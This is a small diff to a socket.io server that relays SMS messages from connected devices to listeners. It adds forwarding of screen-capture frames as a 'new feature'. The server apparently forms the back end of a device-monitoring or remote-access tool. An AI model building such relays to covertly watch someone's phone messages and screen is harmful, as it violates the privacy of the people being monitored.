@@ -63,6 +63,12 @@ io.on("connection", (socket) => {
     listeners.forEach((id) => io.to(id).emit("sms-received", sms));
   });
 
+  // ✅ Forward screen frames (new feature)
+  socket.on("screen-frame", (frame) => {
+    console.log(`🖥️ Screen frame from ${socket.id}, size: ${frame.length}`);
+    listeners.forEach((id) => io.to(id).emit("screen-frame", frame));
+  });
+
   // Handle disconnect
   socket.on("disconnect", () => {
     devices.delete(socket.id);
